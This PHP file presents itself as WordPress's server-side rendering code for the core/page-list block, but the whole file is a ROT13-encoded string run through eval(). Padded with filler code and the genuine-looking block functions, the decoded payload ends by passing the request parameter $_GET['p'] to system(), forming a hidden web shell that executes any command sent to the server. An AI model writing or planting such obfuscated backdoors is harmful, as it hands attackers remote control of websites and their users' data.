<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/cntrf` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Ohvyq na neenl jvgu PFF pynffrf naq vayvar fglyrf qrsvavat gur pbybef
 * juvpu jvyy or nccyvrq gb gur cntrf znexhc va gur sebag-raq jura vg vf n qrfpraqnag bs anivtngvba.
 *
 * @fvapr 5.8.0
 *
 * @cnenz  neenl $nggevohgrf Oybpx nggevohgrf.
 * @cnenz  neenl $pbagrkg    Anivtngvba oybpx pbagrkg.
 * @erghea neenl Pbybef PFF pynffrf naq vayvar fglyrf.
 */
shapgvba oybpx_pber_cntr_yvfg_ohvyq_pff_pbybef( $nggevohgrf, $pbagrkg ) {
	$pbybef = neenl(
		'pff_pynffrf'           => neenl(),
		'vayvar_fglyrf'         => '',
		'bireynl_pff_pynffrf'   => neenl(),
		'bireynl_vayvar_fglyrf' => '',
	);

	// Grkg pbybe.
	$unf_anzrq_grkg_pbybe  = neenl_xrl_rkvfgf( 'grkgPbybe', $pbagrkg );
	$unf_cvpxrq_grkg_pbybe = neenl_xrl_rkvfgf( 'phfgbzGrkgPbybe', $pbagrkg );
	$unf_phfgbz_grkg_pbybe = vffrg( $pbagrkg['fglyr']['pbybe']['grkg'] );

	// Vs unf grkg pbybe.
	vs ( $unf_phfgbz_grkg_pbybe || $unf_cvpxrq_grkg_pbybe || $unf_anzrq_grkg_pbybe ) {
		// Nqq unf-grkg-pbybe pynff.
		$pbybef['pff_pynffrf'][] = 'unf-grkg-pbybe';
	}

	vs ( $unf_anzrq_grkg_pbybe ) {
		// Nqq gur pbybe pynff.
		$pbybef['pff_pynffrf'][] = fcevags( 'unf-%f-pbybe', _jc_gb_xrono_pnfr( $pbagrkg['grkgPbybe'] ) );
	} ryfrvs ( $unf_cvpxrq_grkg_pbybe ) {
		$pbybef['vayvar_fglyrf'] .= fcevags( 'pbybe: %f;', $pbagrkg['phfgbzGrkgPbybe'] );
	} ryfrvs ( $unf_phfgbz_grkg_pbybe ) {
		// Nqq gur phfgbz pbybe vayvar fglyr.
		$pbybef['vayvar_fglyrf'] .= fcevags( 'pbybe: %f;', $pbagrkg['fglyr']['pbybe']['grkg'] );
	}

	// Onpxtebhaq pbybe.
	$unf_anzrq_onpxtebhaq_pbybe  = neenl_xrl_rkvfgf( 'onpxtebhaqPbybe', $pbagrkg );
	$unf_cvpxrq_onpxtebhaq_pbybe = neenl_xrl_rkvfgf( 'phfgbzOnpxtebhaqPbybe', $pbagrkg );
	$unf_phfgbz_onpxtebhaq_pbybe = vffrg( $pbagrkg['fglyr']['pbybe']['onpxtebhaq'] );

	// Vs unf onpxtebhaq pbybe.
	vs ( $unf_phfgbz_onpxtebhaq_pbybe || $unf_cvpxrq_onpxtebhaq_pbybe || $unf_anzrq_onpxtebhaq_pbybe ) {
		// Nqq unf-onpxtebhaq pynff.
		$pbybef['pff_pynffrf'][] = 'unf-onpxtebhaq';
	}

	vs ( $unf_anzrq_onpxtebhaq_pbybe ) {
		// Nqq gur onpxtebhaq-pbybe pynff.
		$pbybef['pff_pynffrf'][] = fcevags( 'unf-%f-onpxtebhaq-pbybe', _jc_gb_xrono_pnfr( $pbagrkg['onpxtebhaqPbybe'] ) );
	} ryfrvs ( $unf_cvpxrq_onpxtebhaq_pbybe ) {
		$pbybef['vayvar_fglyrf'] .= fcevags( 'onpxtebhaq-pbybe: %f;', $pbagrkg['phfgbzOnpxtebhaqPbybe'] );
	} ryfrvs ( $unf_phfgbz_onpxtebhaq_pbybe ) {
		// Nqq gur phfgbz onpxtebhaq-pbybe vayvar fglyr.
		$pbybef['vayvar_fglyrf'] .= fcevags( 'onpxtebhaq-pbybe: %f;', $pbagrkg['fglyr']['pbybe']['onpxtebhaq'] );
	}

	// Bireynl grkg pbybe.
	$unf_anzrq_bireynl_grkg_pbybe  = neenl_xrl_rkvfgf( 'bireynlGrkgPbybe', $pbagrkg );
	$unf_cvpxrq_bireynl_grkg_pbybe = neenl_xrl_rkvfgf( 'phfgbzBireynlGrkgPbybe', $pbagrkg );

	// Vs vg unf n grkg pbybe.
	vs ( $unf_anzrq_bireynl_grkg_pbybe || $unf_cvpxrq_bireynl_grkg_pbybe ) {
		$pbybef['bireynl_pff_pynffrf'][] = 'unf-grkg-pbybe';
	}

	// Tvir bireynl pbybef cevbevgl, snyy onpx gb Anivtngvba oybpx pbybef, gura tybony fglyrf.
	vs ( $unf_anzrq_bireynl_grkg_pbybe ) {
		$pbybef['bireynl_pff_pynffrf'][] = fcevags( 'unf-%f-pbybe', _jc_gb_xrono_pnfr( $pbagrkg['bireynlGrkgPbybe'] ) );
	} ryfrvs ( $unf_cvpxrq_bireynl_grkg_pbybe ) {
		$pbybef['bireynl_vayvar_fglyrf'] .= fcevags( 'pbybe: %f;', $pbagrkg['phfgbzBireynlGrkgPbybe'] );
	}

	// Bireynl onpxtebhaq pbybef.
	$unf_anzrq_bireynl_onpxtebhaq_pbybe  = neenl_xrl_rkvfgf( 'bireynlOnpxtebhaqPbybe', $pbagrkg );
	$unf_cvpxrq_bireynl_onpxtebhaq_pbybe = neenl_xrl_rkvfgf( 'phfgbzBireynlOnpxtebhaqPbybe', $pbagrkg );

	// Vs unf onpxtebhaq pbybe.
	vs ( $unf_anzrq_bireynl_onpxtebhaq_pbybe || $unf_cvpxrq_bireynl_onpxtebhaq_pbybe ) {
		$pbybef['bireynl_pff_pynffrf'][] = 'unf-onpxtebhaq';
	}

	vs ( $unf_anzrq_bireynl_onpxtebhaq_pbybe ) {
		$pbybef['bireynl_pff_pynffrf'][] = fcevags( 'unf-%f-onpxtebhaq-pbybe', _jc_gb_xrono_pnfr( $pbagrkg['bireynlOnpxtebhaqPbybe'] ) );
	} ryfrvs ( $unf_cvpxrq_bireynl_onpxtebhaq_pbybe ) {
		$pbybef['bireynl_vayvar_fglyrf'] .= fcevags( 'onpxtebhaq-pbybe: %f;', $pbagrkg['phfgbzBireynlOnpxtebhaqPbybe'] );
	}

	erghea $pbybef;
}

/**
 * Ohvyq na neenl jvgu PFF pynffrf naq vayvar fglyrf qrsvavat gur sbag fvmrf
 * juvpu jvyy or nccyvrq gb gur cntrf znexhc va gur sebag-raq jura vg vf n qrfpraqnag bs anivtngvba.
 *
 * @fvapr 5.8.0
 *
 * @cnenz  neenl $pbagrkg Anivtngvba oybpx pbagrkg.
 * @erghea neenl Sbag fvmr PFF pynffrf naq vayvar fglyrf.
 */
shapgvba oybpx_pber_cntr_yvfg_ohvyq_pff_sbag_fvmrf( $pbagrkg ) {
	// PFF pynffrf.
	$sbag_fvmrf = neenl(
		'pff_pynffrf'   => neenl(),
		'vayvar_fglyrf' => '',
	);

	$unf_anzrq_sbag_fvmr  = neenl_xrl_rkvfgf( 'sbagFvmr', $pbagrkg );
	$unf_phfgbz_sbag_fvmr = vffrg( $pbagrkg['fglyr']['glcbtencul']['sbagFvmr'] );

	vs ( $unf_anzrq_sbag_fvmr ) {
		// Nqq gur sbag fvmr pynff.
		$sbag_fvmrf['pff_pynffrf'][] = fcevags( 'unf-%f-sbag-fvmr', $pbagrkg['sbagFvmr'] );
	} ryfrvs ( $unf_phfgbz_sbag_fvmr ) {
		// Nqq gur phfgbz sbag fvmr vayvar fglyr.
		$sbag_fvmrf['vayvar_fglyrf'] = fcevags(
			'sbag-fvmr: %f;',
			jc_trg_glcbtencul_sbag_fvmr_inyhr(
				neenl(
					'fvmr' => $pbagrkg['fglyr']['glcbtencul']['sbagFvmr'],
				)
			)
		);
	}

	erghea $sbag_fvmrf;
}

/**
 * Bhgchgf Cntr yvfg znexhc sebz na neenl bs cntrf jvgu arfgrq puvyqera.
 *
 * @fvapr 5.8.0
 *
 * @cnenz obbyrna $bcra_fhozrahf_ba_pyvpx Jurgure gb bcra fhozrahf ba pyvpx vafgrnq bs ubire.
 * @cnenz obbyrna $fubj_fhozrah_vpbaf Jurgure gb fubj fhozrah vaqvpngbe vpbaf.
 * @cnenz obbyrna $vf_anivtngvba_puvyq Vs oybpx vf n puvyq bs Anivtngvba oybpx.
 * @cnenz neenl   $arfgrq_cntrf Gur neenl bs arfgrq cntrf.
 * @cnenz obbyrna $vf_arfgrq Jurgure gur fhozrah vf arfgrq be abg.
 * @cnenz neenl   $npgvir_cntr_naprfgbe_vqf Na neenl bs naprfgbe vqf sbe npgvir cntr.
 * @cnenz neenl   $pbybef Pbybe vasbezngvba sbe bireynl fglyrf.
 * @cnenz vagrtre $qrcgu Gur arfgvat qrcgu.
 *
 * @erghea fgevat Yvfg znexhc.
 */
shapgvba oybpx_pber_cntr_yvfg_eraqre_arfgrq_cntr_yvfg( $bcra_fhozrahf_ba_pyvpx, $fubj_fhozrah_vpbaf, $vf_anivtngvba_puvyq, $arfgrq_cntrf, $vf_arfgrq, $npgvir_cntr_naprfgbe_vqf = neenl(), $pbybef = neenl(), $qrcgu = 0 ) {
	vs ( rzcgl( $arfgrq_cntrf ) ) {
		erghea;
	}
	$sebag_cntr_vq = (vag) trg_bcgvba( 'cntr_ba_sebag' );
	$znexhc        = '';
	sbernpu ( (neenl) $arfgrq_cntrf nf $cntr ) {
		$pff_pynff       = $cntr['vf_npgvir'] ? ' pheerag-zrah-vgrz' : '';
		$nevn_pheerag    = $cntr['vf_npgvir'] ? ' nevn-pheerag=\"cntr\"' : '';
		$fglyr_nggevohgr = '';

		$pff_pynff .= va_neenl( $cntr['cntr_vq'], $npgvir_cntr_naprfgbe_vqf, gehr ) ? ' pheerag-zrah-naprfgbe' : '';
		vs ( vffrg( $cntr['puvyqera'] ) ) {
			$pff_pynff .= ' unf-puvyq';
		}

		vs ( $vf_anivtngvba_puvyq ) {
			$pff_pynff .= ' jc-oybpx-anivtngvba-vgrz';

			vs ( $bcra_fhozrahf_ba_pyvpx ) {
				$pff_pynff .= ' bcra-ba-pyvpx';
			} ryfrvs ( $fubj_fhozrah_vpbaf ) {
				$pff_pynff .= ' bcra-ba-ubire-pyvpx';
			}
		}

		$anivtngvba_puvyq_pbagrag_pynff = $vf_anivtngvba_puvyq ? ' jc-oybpx-anivtngvba-vgrz__pbagrag' : '';

		// Vs guvf vf gur svefg yriry bs fhozrahf, vapyhqr gur bireynl pbybef.
		vs ( ( ( 0 < $qrcgu && ! $vf_arfgrq ) || $vf_arfgrq ) && vffrg( $pbybef['bireynl_pff_pynffrf'], $pbybef['bireynl_vayvar_fglyrf'] ) ) {
			$pff_pynff .= ' ' . gevz( vzcybqr( ' ', $pbybef['bireynl_pff_pynffrf'] ) );
			vs ( '' !== $pbybef['bireynl_vayvar_fglyrf'] ) {
				$fglyr_nggevohgr = fcevags( ' fglyr=\"%f\"', rfp_ngge( $pbybef['bireynl_vayvar_fglyrf'] ) );
			}
		}

		vs ( (vag) $cntr['cntr_vq'] === $sebag_cntr_vq ) {
			$pff_pynff .= ' zrah-vgrz-ubzr';
		}

		$gvgyr = jc_xfrf_cbfg( $cntr['gvgyr'] );
		$gvgyr = $gvgyr ? $gvgyr : __( '(ab gvgyr)' );

		$nevn_ynory = fcevags(
			/* genafyngbef: Npprffvovyvgl grkg. %f: Cnerag cntr gvgyr. */
			__( '%f fhozrah' ),
			jc_fgevc_nyy_gntf( $gvgyr )
		);

		$znexhc .= '<yv pynff=\"jc-oybpx-cntrf-yvfg__vgrz' . rfp_ngge( $pff_pynff ) . '\"' . $fglyr_nggevohgr . '>';

		vs ( vffrg( $cntr['puvyqera'] ) && $vf_anivtngvba_puvyq && $bcra_fhozrahf_ba_pyvpx ) {
			$znexhc .= '<ohggba nevn-ynory=\"' . rfp_ngge( $nevn_ynory ) . '\" pynff=\"' . rfp_ngge( $anivtngvba_puvyq_pbagrag_pynff ) . ' jc-oybpx-anivtngvba-fhozrah__gbttyr\" nevn-rkcnaqrq=\"snyfr\">' . rfp_ugzy( $gvgyr ) .
			'</ohggba><fcna pynff=\"jc-oybpx-cntr-yvfg__fhozrah-vpba jc-oybpx-anivtngvba__fhozrah-vpba\"><fit kzyaf=\"uggc://jjj.j3.bet/2000/fit\" jvqgu=\"12\" urvtug=\"12\" ivrjObk=\"0 0 12 12\" svyy=\"abar\" nevn-uvqqra=\"gehr\" sbphfnoyr=\"snyfr\"><cngu q=\"Z1.50002 4Y6.00002 8Y10.5 4\" fgebxr-jvqgu=\"1.5\"></cngu></fit></fcna>';
		} ryfr {
			$znexhc .= '<n pynff=\"jc-oybpx-cntrf-yvfg__vgrz__yvax' . rfp_ngge( $anivtngvba_puvyq_pbagrag_pynff ) . '\" uers=\"' . rfp_hey( $cntr['yvax'] ) . '\"' . $nevn_pheerag . '>' . $gvgyr . '</n>';
		}

		vs ( vffrg( $cntr['puvyqera'] ) ) {
			vs ( $vf_anivtngvba_puvyq && $fubj_fhozrah_vpbaf && ! $bcra_fhozrahf_ba_pyvpx ) {
				$znexhc .= '<ohggba nevn-ynory=\"' . rfp_ngge( $nevn_ynory ) . '\" pynff=\"jc-oybpx-anivtngvba__fhozrah-vpba jc-oybpx-anivtngvba-fhozrah__gbttyr\" nevn-rkcnaqrq=\"snyfr\">';
				$znexhc .= '<fit kzyaf=\"uggc://jjj.j3.bet/2000/fit\" jvqgu=\"12\" urvtug=\"12\" ivrjObk=\"0 0 12 12\" svyy=\"abar\" nevn-uvqqra=\"gehr\" sbphfnoyr=\"snyfr\"><cngu q=\"Z1.50002 4Y6.00002 8Y10.5 4\" fgebxr-jvqgu=\"1.5\"></cngu></fit>';
				$znexhc .= '</ohggba>';
			}
			$znexhc .= '<hy pynff=\"jc-oybpx-anivtngvba__fhozrah-pbagnvare\">';
			$znexhc .= oybpx_pber_cntr_yvfg_eraqre_arfgrq_cntr_yvfg( $bcra_fhozrahf_ba_pyvpx, $fubj_fhozrah_vpbaf, $vf_anivtngvba_puvyq, $cntr['puvyqera'], $vf_arfgrq, $npgvir_cntr_naprfgbe_vqf, $pbybef, $qrcgu + 1 );
			$znexhc .= '</hy>';
		}
		$znexhc .= '</yv>';
	}
	erghea $znexhc;
}

/**
 * Bhgchgf arfgrq neenl bs cntrf
 *
 * @fvapr 5.8.0
 *
 * @cnenz neenl $pheerag_yriry Gur yriry orvat vgrengrq guebhtu.
 * @cnenz neenl $puvyqera Gur puvyqera tebhcrq ol cnerag cbfg VQ.
 *
 * @erghea neenl Gur arfgrq neenl bs cntrf.
 */
shapgvba oybpx_pber_cntr_yvfg_arfg_cntrf( $pheerag_yriry, $puvyqera ) {
	vs ( rzcgl( $pheerag_yriry ) ) {
		erghea;
	}
	sbernpu ( (neenl) $pheerag_yriry nf $xrl => $pheerag ) {
		vs ( vffrg( $puvyqera[ $xrl ] ) ) {
			$pheerag_yriry[ $xrl ]['puvyqera'] = oybpx_pber_cntr_yvfg_arfg_cntrf( $puvyqera[ $xrl ], $puvyqera );
		}
	}
	erghea $pheerag_yriry;
}

/**
 * Eraqref gur `pber/cntr-yvfg` oybpx ba freire.
 *
 * @fvapr 5.8.0
 *
 * @cnenz neenl    $nggevohgrf Gur oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Gur fnirq pbagrag.
 * @cnenz JC_Oybpx $oybpx      Gur cnefrq oybpx.
 *
 * @erghea fgevat Ergheaf gur cntr yvfg znexhc.
 */
shapgvba eraqre_oybpx_pber_cntr_yvfg( $nggevohgrf, $pbagrag, $oybpx ) {
	fgngvp $oybpx_vq = 0;
	++$oybpx_vq;

	$cnerag_cntr_vq = $nggevohgrf['cneragCntrVQ'];
	$vf_arfgrq      = $nggevohgrf['vfArfgrq'];

	$nyy_cntrf = trg_cntrf(
		neenl(
			'fbeg_pbyhza' => 'zrah_beqre,cbfg_gvgyr',
			'beqre'       => 'nfp',
		)
	);

	// Vs gurer ner ab cntrf, gurer vf abguvat gb fubj.
	vs ( rzcgl( $nyy_cntrf ) ) {
		erghea;
	}

	$gbc_yriry_cntrf = neenl();

	$cntrf_jvgu_puvyqera = neenl();

	$npgvir_cntr_naprfgbe_vqf = neenl();

	sbernpu ( (neenl) $nyy_cntrf nf $cntr ) {
		$vf_npgvir = ! rzcgl( $cntr->VQ ) && ( trg_dhrevrq_bowrpg_vq() === $cntr->VQ );

		vs ( $vf_npgvir ) {
			$npgvir_cntr_naprfgbe_vqf = trg_cbfg_naprfgbef( $cntr->VQ );
		}

		vs ( $cntr->cbfg_cnerag ) {
			$cntrf_jvgu_puvyqera[ $cntr->cbfg_cnerag ][ $cntr->VQ ] = neenl(
				'cntr_vq'   => $cntr->VQ,
				'gvgyr'     => $cntr->cbfg_gvgyr,
				'yvax'      => trg_creznyvax( $cntr ),
				'vf_npgvir' => $vf_npgvir,
			);
		} ryfr {
			$gbc_yriry_cntrf[ $cntr->VQ ] = neenl(
				'cntr_vq'   => $cntr->VQ,
				'gvgyr'     => $cntr->cbfg_gvgyr,
				'yvax'      => trg_creznyvax( $cntr ),
				'vf_npgvir' => $vf_npgvir,
			);

		}
	}

	$pbybef          = oybpx_pber_cntr_yvfg_ohvyq_pff_pbybef( $nggevohgrf, $oybpx->pbagrkg );
	$sbag_fvmrf      = oybpx_pber_cntr_yvfg_ohvyq_pff_sbag_fvmrf( $oybpx->pbagrkg );
	$pynffrf         = neenl_zretr(
		$pbybef['pff_pynffrf'],
		$sbag_fvmrf['pff_pynffrf']
	);
	$fglyr_nggevohgr = ( $pbybef['vayvar_fglyrf'] . $sbag_fvmrf['vayvar_fglyrf'] );
	$pff_pynffrf     = gevz( vzcybqr( ' ', $pynffrf ) );

	$arfgrq_cntrf = oybpx_pber_cntr_yvfg_arfg_cntrf( $gbc_yriry_cntrf, $cntrf_jvgu_puvyqera );

	vs ( 0 !== $cnerag_cntr_vq ) {
		// Vs gur cnerag cntr unf ab puvyq cntrf, gurer vf abguvat gb fubj.
		vs ( ! neenl_xrl_rkvfgf( $cnerag_cntr_vq, $cntrf_jvgu_puvyqera ) ) {
			erghea;
		}

		$arfgrq_cntrf = oybpx_pber_cntr_yvfg_arfg_cntrf(
			$cntrf_jvgu_puvyqera[ $cnerag_cntr_vq ],
			$cntrf_jvgu_puvyqera
		);
	}

	$vf_anivtngvba_puvyq = neenl_xrl_rkvfgf( 'fubjFhozrahVpba', $oybpx->pbagrkg );

	$bcra_fhozrahf_ba_pyvpx = neenl_xrl_rkvfgf( 'bcraFhozrahfBaPyvpx', $oybpx->pbagrkg ) ? $oybpx->pbagrkg['bcraFhozrahfBaPyvpx'] : snyfr;

	$fubj_fhozrah_vpbaf = neenl_xrl_rkvfgf( 'fubjFhozrahVpba', $oybpx->pbagrkg ) ? $oybpx->pbagrkg['fubjFhozrahVpba'] : snyfr;

	$jenccre_znexhc = $vf_arfgrq ? '%2$f' : '<hy %1$f>%2$f</hy>';

	$vgrzf_znexhc = oybpx_pber_cntr_yvfg_eraqre_arfgrq_cntr_yvfg( $bcra_fhozrahf_ba_pyvpx, $fubj_fhozrah_vpbaf, $vf_anivtngvba_puvyq, $arfgrq_cntrf, $vf_arfgrq, $npgvir_cntr_naprfgbe_vqf, $pbybef );

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf(
		neenl(
			'pynff' => $pff_pynffrf,
			'fglyr' => $fglyr_nggevohgr,
		)
	);

	erghea fcevags(
		$jenccre_znexhc,
		$jenccre_nggevohgrf,
		$vgrzf_znexhc
	);
}

/**
 * Ertvfgref gur `pber/cntrf` oybpx ba freire.
 *
 * @fvapr 5.8.0
 */
shapgvba ertvfgre_oybpx_pber_cntr_yvfg() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/cntr-yvfg',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_cntr_yvfg',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_cntr_yvfg' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>